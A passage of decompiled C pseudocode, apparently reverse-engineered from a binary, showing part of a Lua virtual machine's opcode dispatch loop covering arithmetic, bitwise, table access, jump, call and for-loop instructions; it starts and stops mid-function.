        if ( ((v366 >> 23) & 0x100) != 0 )
          v76 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v76 = v367 + 16 * (v366 >> 23);
        v290 = (double *)v76;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v77 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v77 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v289 = (double *)v77;
        if ( *((_DWORD *)v290 + 2) == 3 )
        {
          v196 = *v290;
        }
        else if ( !sub_74D7704(v290, &v196) )
        {
          goto LABEL_162;
        }
        if ( *((_DWORD *)v289 + 2) == 3 )
        {
          v195 = *v289;
LABEL_161:
          v78 = 1;
          goto LABEL_163;
        }
        if ( sub_74D7704(v289, &v195) )
          goto LABEL_161;
LABEL_162:
        v78 = 0;
LABEL_163:
        if ( v78 )
        {
          v288 = v365;
          *(double *)v365 = v196 / v195;
          *((_DWORD *)v288 + 2) = 3;
        }
        else
        {
          sub_74D63E8(a1, v290, v289, v365, 11);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 6u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v100 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v100 = v367 + 16 * (v366 >> 23);
        v266 = v100;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v101 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v101 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v265 = v101;
        if ( *(_DWORD *)(v266 + 8) == 19 && *(_DWORD *)(v265 + 8) == 19 )
        {
          v264 = *(double *)v266;
          v263 = *(double *)v265;
          v262 = v365;
          v102 = sub_74D94D8(a1, &v264, LODWORD(v264), HIDWORD(v264), LODWORD(v263), HIDWORD(v263));
          *(_QWORD *)v262 = v102;
          *((_DWORD *)v262 + 2) = 19;
          continue;
        }
        if ( *(_DWORD *)(v266 + 8) == 3 )
        {
          v182 = *(double *)v266;
        }
        else if ( !sub_74D7704((_DWORD *)v266, &v182) )
        {
          goto LABEL_289;
        }
        if ( *(_DWORD *)(v265 + 8) == 3 )
        {
          v181 = *(double *)v265;
LABEL_288:
          v103 = 1;
          goto LABEL_290;
        }
        if ( sub_74D7704((_DWORD *)v265, &v181) )
          goto LABEL_288;
LABEL_289:
        v103 = 0;
LABEL_290:
        if ( v103 )
        {
          v261 = v365;
          v104 = floor(v182 / v181);
          *(double *)v261 = v104;
          *((_DWORD *)v261 + 2) = 3;
        }
        else
        {
          sub_74D63E8(a1, v266, v265, v365, 12);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 7u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v79 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v79 = v367 + 16 * (v366 >> 23);
        v287 = v79;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v80 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v80 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v286 = v80;
        if ( *(_DWORD *)(v287 + 8) == 19 )
        {
          v194 = *(_QWORD *)v287;
        }
        else if ( !sub_74D7828(v287, &v194, 0) )
        {
          goto LABEL_179;
        }
        if ( *(_DWORD *)(v286 + 8) == 19 )
        {
          v193 = *(_QWORD *)v286;
LABEL_178:
          v81 = 1;
          goto LABEL_180;
        }
        if ( sub_74D7828(v286, &v193, 0) )
          goto LABEL_178;
LABEL_179:
        v81 = 0;
LABEL_180:
        if ( v81 )
        {
          v285 = v365;
          *(_QWORD *)v365 = v193 & v194;
          *((_DWORD *)v285 + 2) = 19;
        }
        else
        {
          sub_74D63E8(a1, v287, v286, v365, 13);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 8u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v82 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v82 = v367 + 16 * (v366 >> 23);
        v284 = v82;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v83 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v83 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v283 = v83;
        if ( *(_DWORD *)(v284 + 8) == 19 )
        {
          v192 = *(_QWORD *)v284;
        }
        else if ( !sub_74D7828(v284, &v192, 0) )
        {
          goto LABEL_196;
        }
        if ( *(_DWORD *)(v283 + 8) == 19 )
        {
          v191 = *(_QWORD *)v283;
LABEL_195:
          v84 = 1;
          goto LABEL_197;
        }
        if ( sub_74D7828(v283, &v191, 0) )
          goto LABEL_195;
LABEL_196:
        v84 = 0;
LABEL_197:
        if ( v84 )
        {
          v282 = v365;
          *(_QWORD *)v365 = v191 | v192;
          *((_DWORD *)v282 + 2) = 19;
        }
        else
        {
          sub_74D63E8(a1, v284, v283, v365, 14);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 9u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v85 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v85 = v367 + 16 * (v366 >> 23);
        v281 = v85;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v86 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v86 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v280 = v86;
        if ( *(_DWORD *)(v281 + 8) == 19 )
        {
          v190 = *(_QWORD *)v281;
        }
        else if ( !sub_74D7828(v281, &v190, 0) )
        {
          goto LABEL_213;
        }
        if ( *(_DWORD *)(v280 + 8) == 19 )
        {
          v189 = *(_QWORD *)v280;
LABEL_212:
          v87 = 1;
          goto LABEL_214;
        }
        if ( sub_74D7828(v280, &v189, 0) )
          goto LABEL_212;
LABEL_213:
        v87 = 0;
LABEL_214:
        if ( v87 )
        {
          v279 = v365;
          *(_QWORD *)v365 = v190 ^ v189;
          *((_DWORD *)v279 + 2) = 19;
        }
        else
        {
          sub_74D63E8(a1, v281, v280, v365, 15);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 10u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v88 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v88 = v367 + 16 * (v366 >> 23);
        v278 = v88;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v89 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v89 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v277 = v89;
        if ( *(_DWORD *)(v278 + 8) == 19 )
        {
          v188 = *(_QWORD *)v278;
        }
        else if ( !sub_74D7828(v278, &v188, 0) )
        {
          goto LABEL_230;
        }
        if ( *(_DWORD *)(v277 + 8) == 19 )
        {
          v187 = *(_QWORD *)v277;
LABEL_229:
          v90 = 1;
          goto LABEL_231;
        }
        if ( sub_74D7828(v277, &v187, 0) )
          goto LABEL_229;
LABEL_230:
        v90 = 0;
LABEL_231:
        if ( v90 )
        {
          v276 = v365;
          v91 = sub_74D9670(v188, HIDWORD(v188), v187, HIDWORD(v187));
          *(_QWORD *)v276 = v91;
          *((_DWORD *)v276 + 2) = 19;
        }
        else
        {
          sub_74D63E8(a1, v278, v277, v365, 16);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 11u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v92 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v92 = v367 + 16 * (v366 >> 23);
        v275 = v92;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v93 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v93 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v274 = v93;
        if ( *(_DWORD *)(v275 + 8) == 19 )
        {
          v186 = *(_QWORD *)v275;
        }
        else if ( !sub_74D7828(v275, &v186, 0) )
        {
          goto LABEL_247;
        }
        if ( *(_DWORD *)(v274 + 8) == 19 )
        {
          v185 = *(_QWORD *)v274;
LABEL_246:
          v94 = 1;
          goto LABEL_248;
        }
        if ( sub_74D7828(v274, &v185, 0) )
          goto LABEL_246;
LABEL_247:
        v94 = 0;
LABEL_248:
        if ( v94 )
        {
          v273 = v365;
          v95 = sub_74D9670(v186, HIDWORD(v186), -(int)v185, (unsigned __int64)-v185 >> 32);
          *(_QWORD *)v273 = v95;
          *((_DWORD *)v273 + 2) = 19;
        }
        else
        {
          sub_74D63E8(a1, v275, v274, v365, 17);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 12u:
        v257 = v367 + 16 * (v366 >> 23);
        if ( *(_DWORD *)(v257 + 8) == 19 )
        {
          v256 = *(double *)v257;
          v255 = v365;
          *(_QWORD *)v365 = -*(_QWORD *)&v256;
          *((_DWORD *)v255 + 2) = 19;
        }
        else
        {
          if ( *(_DWORD *)(v257 + 8) == 3 )
          {
            v178 = *(double *)v257;
            v108 = 1;
          }
          else
          {
            v108 = sub_74D7704((_DWORD *)v257, &v178) != 0;
          }
          if ( v108 )
          {
            v254 = v365;
            *(double *)v365 = -v178;
            *((_DWORD *)v254 + 2) = 3;
          }
          else
          {
            sub_74D63E8(a1, v257, v257, v365, 18);
            v367 = *(_DWORD *)(v368 + 16);
          }
        }
        continue;
      case 13u:
        v253 = v367 + 16 * (v366 >> 23);
        if ( *(_DWORD *)(v253 + 8) == 19 )
        {
          v177 = *(_QWORD *)v253;
          v109 = 1;
        }
        else
        {
          v109 = sub_74D7828(v253, &v177, 0) != 0;
        }
        if ( v109 )
        {
          v252 = v365;
          *(_QWORD *)v365 = ~v177;
          *((_DWORD *)v252 + 2) = 19;
        }
        else
        {
          sub_74D63E8(a1, v253, v253, v365, 19);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 14u:
        v251 = (_DWORD *)(v367 + 16 * (v366 >> 23));
        v110 = !v251[2] || v251[2] == 1 && !*v251;
        v250 = v110;
        v249 = v365;
        *(_DWORD *)v365 = v110;
        *((_DWORD *)v249 + 2) = 1;
        continue;
      case 15u:
        sub_74D930C(a1, v365, v367 + 16 * (v366 >> 23));
        v367 = *(_DWORD *)(v368 + 16);
        continue;
      case 16u:
        v248 = v366 >> 23;
        v247 = (v366 >> 14) & 0x1FF;
        a1[3] = v367 + 16 * (v247 + 1);
        sub_74D8E6C(a1, v247 - v248 + 1);
        v367 = *(_DWORD *)(v368 + 16);
        v365 = (char *)(v367 + 16 * (unsigned __int8)(v366 >> 6));
        v246 = (char *)(v367 + 16 * v248);
        v245 = v365;
        v111 = v365;
        v112 = *((_DWORD *)v246 + 1);
        v113 = *((_DWORD *)v246 + 2);
        v114 = *((_DWORD *)v246 + 3);
        *(_DWORD *)v365 = *(_DWORD *)v246;
        *((_DWORD *)v111 + 1) = v112;
        *((_DWORD *)v111 + 2) = v113;
        *((_DWORD *)v111 + 3) = v114;
        if ( *(int *)(a1[4] + 12) > 0 )
        {
          if ( v365 < v246 )
            v115 = v246;
          else
            v115 = v365 + 16;
          a1[3] = (int)v115;
          sub_74C61D0(a1);
          a1[3] = *(_DWORD *)(v368 + 4);
          v367 = *(_DWORD *)(v368 + 16);
        }
        a1[3] = *(_DWORD *)(v368 + 4);
        continue;
      case 17u:
        v339 = v365;
        v2 = (int *)(v367 + 16 * (v366 >> 23));
        v3 = v365;
        v4 = *v2;
        v5 = v2[1];
        v6 = v2[2];
        v7 = v2[3];
        *(_DWORD *)v365 = v4;
        *((_DWORD *)v3 + 1) = v5;
        *((_DWORD *)v3 + 2) = v6;
        *((_DWORD *)v3 + 3) = v7;
        continue;
      case 18u:
        v338 = (_DWORD *)(v349 + 16 * (v366 >> 14));
        v337 = v365;
        v8 = v365;
        v9 = v338[1];
        v10 = v338[2];
        v11 = v338[3];
        *(_DWORD *)v365 = *v338;
        *((_DWORD *)v8 + 1) = v9;
        *((_DWORD *)v8 + 2) = v10;
        *((_DWORD *)v8 + 3) = v11;
        continue;
      case 19u:
        v12 = *(_DWORD **)(v368 + 20);
        *(_DWORD *)(v368 + 20) = v12 + 1;
        v336 = (_DWORD *)(v349 + 16 * (*v12 >> 6));
        v335 = v365;
        v13 = v365;
        v14 = v336[1];
        v15 = v336[2];
        v16 = v336[3];
        *(_DWORD *)v365 = *v336;
        *((_DWORD *)v13 + 1) = v14;
        *((_DWORD *)v13 + 2) = v15;
        *((_DWORD *)v13 + 3) = v16;
        continue;
      case 20u:
        v334 = v365;
        *(_DWORD *)v365 = v366 >> 23;
        *((_DWORD *)v334 + 2) = 1;
        if ( ((v366 >> 14) & 0x1FF) != 0 )
          *(_DWORD *)(v368 + 20) += 4;
        continue;
      case 21u:
        v364 = v366 >> 23;
        do
        {
          v17 = v365;
          v365 += 16;
          *((_DWORD *)v17 + 2) = 0;
        }
        while ( v364-- );
        continue;
      case 22u:
        v333 = v366 >> 23;
        v332 = v365;
        v19 = **(int ***)(v350 + 4 * ((v366 >> 23) + 4));
        v20 = v365;
        v21 = *v19;
        v22 = v19[1];
        v23 = v19[2];
        v24 = v19[3];
        *(_DWORD *)v365 = v21;
        *((_DWORD *)v20 + 1) = v22;
        *((_DWORD *)v20 + 2) = v23;
        *((_DWORD *)v20 + 3) = v24;
        continue;
      case 23u:
        v331 = **(int ***)(v350 + 4 * ((v366 >> 23) + 4));
        if ( ((v366 >> 14) & 0x100) != 0 )
          v25 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v25 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v330 = (_DWORD *)v25;
        if ( v331[2] == 69 )
        {
          v363 = sub_74D5A18(*v331, v330);
          v26 = v363[2] != 0;
        }
        else
        {
          v363 = 0;
          v26 = 0;
        }
        if ( v26 )
        {
          v329 = v365;
          v27 = v365;
          v28 = v363[1];
          v29 = v363[2];
          v30 = v363[3];
          *(_DWORD *)v365 = *v363;
          *((_DWORD *)v27 + 1) = v28;
          *((_DWORD *)v27 + 2) = v29;
          *((_DWORD *)v27 + 3) = v30;
        }
        else
        {
          luaV_finishget(a1, v331, v330, (int *)v365, v363);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 24u:
        v328 = (int *)(v367 + 16 * (v366 >> 23));
        if ( ((v366 >> 14) & 0x100) != 0 )
          v31 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v31 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v327 = (_DWORD *)v31;
        if ( v328[2] == 69 )
        {
          v362 = sub_74D5A18(*v328, v327);
          v32 = v362[2] != 0;
        }
        else
        {
          v362 = 0;
          v32 = 0;
        }
        if ( v32 )
        {
          v326 = v365;
          v33 = v365;
          v34 = v362[1];
          v35 = v362[2];
          v36 = v362[3];
          *(_DWORD *)v365 = *v362;
          *((_DWORD *)v33 + 1) = v34;
          *((_DWORD *)v33 + 2) = v35;
          *((_DWORD *)v33 + 3) = v36;
        }
        else
        {
          luaV_finishget(a1, v328, v327, (int *)v365, v362);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 25u:
        v325 = **(int ***)(v350 + 4 * ((unsigned __int8)(v366 >> 6) + 4));
        if ( ((v366 >> 23) & 0x100) != 0 )
          v37 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v37 = v367 + 16 * (v366 >> 23);
        v324 = (_DWORD *)v37;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v38 = (int **)(v349 + 16 * (unsigned __int8)(v366 >> 14));
        else
          v38 = (int **)(v367 + 16 * ((v366 >> 14) & 0x1FF));
        v323 = v38;
        if ( v325[2] == 69 )
        {
          v361 = sub_74D5A18(*v325, v324);
          if ( v361[2] )
          {
            if ( ((unsigned int)v323[2] & 0x40) != 0
              && (*(_BYTE *)(*v325 + 5) & 4) != 0
              && (*((_BYTE *)*v323 + 5) & 3) != 0 )
            {
              sub_74C31BC(a1, *v325);
            }
            v40 = v361;
            v41 = v323[1];
            v42 = v323[2];
            v43 = v323[3];
            *v361 = (int)*v323;
            v40[1] = (int)v41;
            v40[2] = (int)v42;
            v40[3] = (int)v43;
            v39 = 0;
          }
          else
          {
            v39 = 1;
          }
        }
        else
        {
          v361 = 0;
          v39 = 1;
        }
        if ( v39 )
        {
          sub_74D7D20(a1, v325, v324, v323, v361);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 26u:
        v322 = *(int ***)(v350 + 4 * ((v366 >> 23) + 4));
        v321 = *v322;
        v44 = v321;
        v45 = *((_DWORD *)v365 + 1);
        v46 = *((_DWORD *)v365 + 2);
        v47 = *((_DWORD *)v365 + 3);
        *v321 = *(_DWORD *)v365;
        v44[1] = v45;
        v44[2] = v46;
        v44[3] = v47;
        if ( ((*v322)[2] & 0x40) != 0 && *v322 == (int *)(v322 + 2) )
          luaC_upvalbarrier((int)a1, v322);
        continue;
      case 27u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v48 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v48 = v367 + 16 * (v366 >> 23);
        v320 = (_DWORD *)v48;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v49 = (int **)(v349 + 16 * (unsigned __int8)(v366 >> 14));
        else
          v49 = (int **)(v367 + 16 * ((v366 >> 14) & 0x1FF));
        v319 = v49;
        if ( *((_DWORD *)v365 + 2) == 69 )
        {
          v360 = sub_74D5A18(*(_DWORD *)v365, v320);
          if ( v360[2] )
          {
            if ( ((unsigned int)v319[2] & 0x40) != 0
              && (*(_BYTE *)(*(_DWORD *)v365 + 5) & 4) != 0
              && (*((_BYTE *)*v319 + 5) & 3) != 0 )
            {
              sub_74C31BC(a1, *(_DWORD *)v365);
            }
            v51 = v360;
            v52 = v319[1];
            v53 = v319[2];
            v54 = v319[3];
            *v360 = (int)*v319;
            v51[1] = (int)v52;
            v51[2] = (int)v53;
            v51[3] = (int)v54;
            v50 = 0;
          }
          else
          {
            v50 = 1;
          }
        }
        else
        {
          v360 = 0;
          v50 = 1;
        }
        if ( v50 )
        {
          sub_74D7D20(a1, (int *)v365, v320, v319, v360);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 28u:
        v318 = v366 >> 23;
        v317 = (v366 >> 14) & 0x1FF;
        v316 = luaH_new((int)a1);
        v315 = v365;
        v314 = v316;
        *(_DWORD *)v365 = v316;
        *((_DWORD *)v315 + 2) = 69;
        if ( v318 || v317 )
        {
          v55 = sub_74C6680(v318);
          v56 = sub_74C6680(v317);
          sub_74D4E18(a1, v316, v55, v56);
        }
        if ( *(int *)(a1[4] + 12) > 0 )
        {
          a1[3] = (int)(v365 + 16);
          sub_74C61D0(a1);
          a1[3] = *(_DWORD *)(v368 + 4);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 29u:
        v313 = (int *)(v367 + 16 * (v366 >> 23));
        if ( ((v366 >> 14) & 0x100) != 0 )
          v57 = (int *)(v349 + 16 * (unsigned __int8)(v366 >> 14));
        else
          v57 = (int *)(v367 + 16 * ((v366 >> 14) & 0x1FF));
        v312 = v57;
        v311 = *v57;
        v310 = v365 + 16;
        v58 = v365 + 16;
        v59 = v313[1];
        v60 = v313[2];
        v61 = v313[3];
        *((_DWORD *)v365 + 4) = *v313;
        *((_DWORD *)v58 + 1) = v59;
        *((_DWORD *)v58 + 2) = v60;
        *((_DWORD *)v58 + 3) = v61;
        if ( v313[2] == 69 )
        {
          v359 = (int *)sub_74D5984(*v313, v311);
          v62 = v359[2] != 0;
        }
        else
        {
          v359 = 0;
          v62 = 0;
        }
        if ( v62 )
        {
          v309 = v365;
          v63 = v365;
          v64 = v359[1];
          v65 = v359[2];
          v66 = v359[3];
          *(_DWORD *)v365 = *v359;
          *((_DWORD *)v63 + 1) = v64;
          *((_DWORD *)v63 + 2) = v65;
          *((_DWORD *)v63 + 3) = v66;
        }
        else
        {
          luaV_finishget(a1, v313, v312, (int *)v365, v359);
          v367 = *(_DWORD *)(v368 + 16);
        }
        continue;
      case 30u:
        v244 = (unsigned __int8)(v366 >> 6);
        if ( (unsigned __int8)(v366 >> 6) )
          sub_74C2BB0(a1, *(_DWORD *)(v368 + 16) + 16 * (v244 + 0xFFFFFFF));
        *(_DWORD *)(v368 + 20) += 4 * ((v366 >> 14) + 1073610753);
        continue;
      case 31u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v116 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v116 = v367 + 16 * (v366 >> 23);
        v243 = v116;
        if ( ((v366 >> 14) & 0x100) != 0 )
          v117 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v117 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v242 = v117;
        v118 = sub_74D87CC(a1, v243, v117);
        if ( v118 == (unsigned __int8)(v366 >> 6) )
        {
          v366 = **(_DWORD **)(v368 + 20);
          v241 = (unsigned __int8)(v366 >> 6);
          if ( (unsigned __int8)(v366 >> 6) )
            sub_74C2BB0(a1, *(_DWORD *)(v368 + 16) + 16 * (v241 + 0xFFFFFFF));
          *(_DWORD *)(v368 + 20) += 4 * ((v366 >> 14) + 1073610754);
        }
        else
        {
          *(_DWORD *)(v368 + 20) += 4;
        }
        v367 = *(_DWORD *)(v368 + 16);
        continue;
      case 32u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v119 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v119 = v367 + 16 * (v366 >> 23);
        if ( ((v366 >> 14) & 0x100) != 0 )
          v120 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v120 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v121 = sub_74D8548(a1, v119, v120);
        if ( v121 == (unsigned __int8)(v366 >> 6) )
        {
          v366 = **(_DWORD **)(v368 + 20);
          v240 = (unsigned __int8)(v366 >> 6);
          if ( (unsigned __int8)(v366 >> 6) )
            sub_74C2BB0(a1, *(_DWORD *)(v368 + 16) + 16 * (v240 + 0xFFFFFFF));
          *(_DWORD *)(v368 + 20) += 4 * ((v366 >> 14) + 1073610754);
        }
        else
        {
          *(_DWORD *)(v368 + 20) += 4;
        }
        v367 = *(_DWORD *)(v368 + 16);
        continue;
      case 33u:
        if ( ((v366 >> 23) & 0x100) != 0 )
          v122 = v349 + 16 * ((v366 >> 23) & 0xFFFFFEFF);
        else
          v122 = v367 + 16 * (v366 >> 23);
        if ( ((v366 >> 14) & 0x100) != 0 )
          v123 = v349 + 16 * (unsigned __int8)(v366 >> 14);
        else
          v123 = v367 + 16 * ((v366 >> 14) & 0x1FF);
        v124 = sub_74D8644(a1, v122, v123);
        if ( v124 == (unsigned __int8)(v366 >> 6) )
        {
          v366 = **(_DWORD **)(v368 + 20);
          v239 = (unsigned __int8)(v366 >> 6);
          if ( (unsigned __int8)(v366 >> 6) )
            sub_74C2BB0(a1, *(_DWORD *)(v368 + 16) + 16 * (v239 + 0xFFFFFFF));
          *(_DWORD *)(v368 + 20) += 4 * ((v366 >> 14) + 1073610754);
        }
        else
        {
          *(_DWORD *)(v368 + 20) += 4;
        }
        v367 = *(_DWORD *)(v368 + 16);
        continue;
      case 34u:
        if ( ((v366 >> 14) & 0x1FF) != 0 )
          v125 = !*((_DWORD *)v365 + 2) || *((_DWORD *)v365 + 2) == 1 && !*(_DWORD *)v365;
        else
          v125 = *((_DWORD *)v365 + 2) && (*((_DWORD *)v365 + 2) != 1 || *(_DWORD *)v365);
        if ( v125 )
        {
          *(_DWORD *)(v368 + 20) += 4;
        }
        else
        {
          v366 = **(_DWORD **)(v368 + 20);
          v238 = (unsigned __int8)(v366 >> 6);
          if ( (unsigned __int8)(v366 >> 6) )
            sub_74C2BB0(a1, *(_DWORD *)(v368 + 16) + 16 * (v238 + 0xFFFFFFF));
          *(_DWORD *)(v368 + 20) += 4 * ((v366 >> 14) + 1073610754);
        }
        continue;
      case 35u:
        v237 = (_DWORD *)(v367 + 16 * (v366 >> 23));
        if ( ((v366 >> 14) & 0x1FF) != 0 )
          v126 = !v237[2] || v237[2] == 1 && !*v237;
        else
          v126 = v237[2] && (v237[2] != 1 || *v237);
        if ( v126 )
        {
          *(_DWORD *)(v368 + 20) += 4;
        }
        else
        {
          v236 = v365;
          v127 = v365;
          v128 = v237[1];
          v129 = v237[2];
          v130 = v237[3];
          *(_DWORD *)v365 = *v237;
          *((_DWORD *)v127 + 1) = v128;
          *((_DWORD *)v127 + 2) = v129;
          *((_DWORD *)v127 + 3) = v130;
          v366 = **(_DWORD **)(v368 + 20);
          v235 = (unsigned __int8)(v366 >> 6);
          if ( (unsigned __int8)(v366 >> 6) )
            sub_74C2BB0(a1, *(_DWORD *)(v368 + 16) + 16 * (v235 + 0xFFFFFFF));
          *(_DWORD *)(v368 + 20) += 4 * ((v366 >> 14) + 1073610754);
        }
        continue;
      case 36u:
        v348 = v366 >> 23;
        v347 = ((v366 >> 14) & 0x1FF) - 1;
        if ( v366 >> 23 )
          a1[3] = (int)&v365[16 * v348];
        if ( !luaD_precall(a1, v365, v347) )
        {
          v368 = a1[5];
          goto LABEL_2;
        }
        if ( v347 >= 0 )
          a1[3] = *(_DWORD *)(v368 + 4);
        v367 = *(_DWORD *)(v368 + 16);
        continue;
      case 37u:
        v346 = v366 >> 23;
        if ( v366 >> 23 )
          a1[3] = (int)&v365[16 * v346];
        if ( luaD_precall(a1, v365, -1) )
        {
          v367 = *(_DWORD *)(v368 + 16);
          continue;
        }
        v345 = (int *)a1[5];
        v344 = v345[2];
        v343 = *v345;
        v342 = *(_DWORD *)v344;
        v341 = v345[4] + 16 * *(unsigned __int8 *)(*(_DWORD *)(*(_DWORD *)v343 + 12) + 6);
        if ( *(int *)(*(_DWORD *)(v350 + 12) + 28) > 0 )
          sub_74C2BB0(a1, *(_DWORD *)(v344 + 16));
        for ( i = 0; v343 + 16 * i < v341; ++i )
        {
          v340 = (_DWORD *)(v342 + 16 * i);
          v131 = (int *)(v343 + 16 * i);
          v132 = v340;
          v133 = *v131;
          v134 = v131[1];
          v135 = v131[2];
          v136 = v131[3];
          *v340 = v133;
          v132[1] = v134;
          v132[2] = v135;
          v132[3] = v136;
        }
        *(_DWORD *)(v344 + 16) = v342 + v345[4] - v343;
        a1[3] = v342 + a1[3] - v343;
        *(_DWORD *)(v344 + 4) = a1[3];
        *(_DWORD *)(v344 + 20) = v345[5];
        *(_WORD *)(v344 + 34) |= 0x20u;
        a1[5] = v344;
        v368 = a1[5];
        goto LABEL_2;
      case 38u:
        v203 = v366 >> 23;
        if ( *(int *)(*(_DWORD *)(v350 + 12) + 28) > 0 )
          sub_74C2BB0(a1, v367);
        if ( v203 )
          v137 = v203 - 1;
        else
          v137 = (a1[3] - (int)v365) >> 4;
        result = sub_74C0984(a1, v368, v365, v137);
        v203 = result;
        if ( (*(_WORD *)(v368 + 34) & 8) == 0 )
        {
          v368 = a1[5];
          if ( v203 )
            a1[3] = *(_DWORD *)(v368 + 4);
          goto LABEL_2;
        }
        return result;
      case 39u:
        if ( *((_DWORD *)v365 + 2) == 19 )
        {
          v234 = *((_QWORD *)v365 + 4);
          v233 = v234 + *(_QWORD *)v365;
          v232 = *((_QWORD *)v365 + 2);
          if ( v234 < 1 )
            v139 = v233 >= v232;
          else
            v139 = v232 >= v233;
          if ( v139 )
          {
            *(_DWORD *)(v368 + 20) += 4 * ((v366 >> 14) + 1073610753);
            v231 = v365;
            *(_QWORD *)v365 = v233;
            v230 = v365 + 48;
            *((_QWORD *)v365 + 6) = v233;
            *((_DWORD *)v230 + 2) = 19;
          }
        }
        else
        {
          v229 = *((double *)v365 + 4);
          v228 = *(double *)v365 + v229;
          v227 = *((double *)v365 + 2);
          if ( v229 <= 0.0 )
            v140 = v227 <= v228;
          else
            v140 = v228 <= v227;
          if ( v140 )
          {
            *(_DWORD *)(v368 + 20) += 4 * ((v366 >> 14) + 1073610753);
            v226 = v365;
            *(double *)v365 = v228;
            v225 = v365 + 48;
            *((double *)v365 + 6) = v228;
            *((_DWORD *)v225 + 2) = 3;
          }
        }
        continue;
      case 40u:
        v224 = v365;
        v223 = v365 + 16;
        v222 = v365 + 32;
        if ( *((_DWORD *)v365 + 2) == 19
          && *((_DWORD *)v222 + 2) == 19
          && sub_74D79D8(v223, &v176, *(_DWORD *)v222, *((_DWORD *)v222 + 1), &v175) )
        {
          if ( v175 )
            v142 = 0.0;
          else
            v142 = *(double *)v224;
          v221 = v142;
          v220 = v223;
          *(_QWORD *)v223 = v176;
          *((_DWORD *)v220 + 2) = 19;
          v219 = v224;
          *(_QWORD *)v224 = *(_QWORD *)&v221 - *(_QWORD *)v222;
          *((_DWORD *)v219 + 2) = 19;
        }
        else
        {
          if ( *((_DWORD *)v223 + 2) == 3 )
          {
            v173 = *(_QWORD *)v223;
            v143 = 0;
          }
          else
          {
            v143 = sub_74D7704(v223, (double *)&v173) == 0;
          }
          if ( v143 )
            sub_74BF574((int)a1, ""'for' limit must be a number"");
          v218 = v223;
          *(_QWORD *)v223 = v173;
          *((_DWORD *)v218 + 2) = 3;
          if ( *((_DWORD *)v222 + 2) == 3 )
          {
            v172 = *(double *)v222;
            v144 = 0;
          }
          else
          {
            v144 = sub_74D7704(v222, &v172) == 0;
          }
          if ( v144 )
            sub_74BF574((int)a1, ""'for' step must be a number"");
          v217 = v222;
          *(double *)v222 = v172;
          *((_DWORD *)v217 + 2) = 3;
          if ( *((_DWORD *)v224 + 2) == 3 )
          {
            v174 = *(double *)v224;
            v145 = 0;
          }
          else
          {
            v145 = sub_74D7704(v224, &v174) == 0;
          }
          if ( v145 )
            sub_74BF574((int)a1, ""'for' initial value must be a number"");
          v216 = v224;
          *(double *)v224 = v174 - v172;
          *((_DWORD *)v216 + 2) = 3;
        }
        *(_DWORD *)(v368 + 20) += 4 * ((v366 >> 14) + 1073610753);
        continue;
      case 41u:
        v215 = v365 + 48;
        v214 = v365 + 80;
